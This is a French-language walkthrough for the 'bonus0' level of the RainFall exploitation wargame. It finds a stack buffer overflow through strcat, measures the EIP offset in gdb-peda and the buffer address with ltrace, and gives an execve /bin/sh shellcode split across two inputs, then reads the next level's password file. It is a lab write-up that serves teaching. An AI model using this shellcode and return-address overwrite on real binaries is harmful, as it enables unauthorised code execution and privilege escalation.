- en lisant le code et en l'executant on comprend qu'il y a un bug/faille
- dans la fonction pp le \0 de la 1er string est remplacer par un espace
- se qui fait quequand la premiere string est entierement remplis il considere str1 et str2 comme une string
- str2 est donc copier a la fin de str1 + str2 dans strcat
- Dans gdb on voit donc qu'on peut ecrire sur la variable $eip
<pre>
gdb-peda$ pattern create 30
'AAA%AAsAABAA$AAnAACAA-AA(AADAA'
gdb-peda$ r
Starting program: /home/alarm/rainfall/bonus0/Ressources/bonus0 
 - 
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii
 - 
AAA%AAsAABAA$AAnAACAA-AA(AADAA
iiiiiiiiiiiiiiiiiiiiAAA%AAsAABAA$AAnAACA AAA%AAsAABAA$AAnAACA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
<strong>EIP: 0x416e4141 ('AAnA')</strong>
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x416e4141
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x416e4141 in ?? ()
gdb-peda$ pattern offset AAnA
<strong>AAnA found at offset: 13</strong>
</pre>

<pre>
bonus0@RainFall:~$ (echo BBBBBBBBBBBBBBBBBBB; sleep 1; echo AAAAAAAAAAAAAAAAAAAAA; cat) | ltrace ./bonus0 
\__libc_start_main(0x80485a4, 1, 0xbffff704, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - ")                                                                                = 4
read(0, "BBBBBBBBBBBBBBBBBBB\n", 4096)                                                     = 20
strchr("BBBBBBBBBBBBBBBBBBB\n", '\n')                                                      = "\n"
strncpy(0xbffff5e8, "BBBBBBBBBBBBBBBBBBB", 20)                                             = 0xbffff5e8
puts(" - ")                                                                                = 4
read(0, "AAAAAAAAAAAAAAAAAAAAA\n", 4096)                                                   = 22
strchr("AAAAAAAAAAAAAAAAAAAAA\n", '\n')                                                    = "\n"
strncpy(0xbffff5fc, "AAAAAAAAAAAAAAAAAAAA", 20)                                            = 0xbffff5fc
strcpy(<strong>0xbffff636</strong>, "BBBBBBBBBBBBBBBBBBB")                                                  = 0xbffff636
strcat("BBBBBBBBBBBBBBBBBBB ", "AAAAAAAAAAAAAAAAAAAA\364\017\375\267")                     = "BBBBBBBBBBBBBBBBBBB AAAAAAAAAAAA"...
puts("BBBBBBBBBBBBBBBBBBB AAAAAAAAAAAA"...)                                                = 45
+++ exited (status 0) +++
</pre>
- On a l'addresse de notre stack (*0xbffff636*)
- Notre shellcode fait 21 carrecter donc on le decoupe en deux 20 dans le premier argument et 1 dans le deuxieme
| Arg 1 | Arg 2 |
|-------|-------|
| `\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\n` | `\80` + `B` \* 8 + `0xbffff636` + `B` \* 20 + `\n`|
- Donc en gros on overide la return address pour qu'elle renvoie sur notre shellcode
- On utilise un code en C car il y a des problemes avec python
```
gcc /tmp/pattern.c -o /tmp/pat
gcc /tmp/shellcode.c -o /tmp/shell
(/tmp/shell; sleep 1; /tmp/pat; cat) | ./bonus0
cat /home/user/bonus0/.pass
```
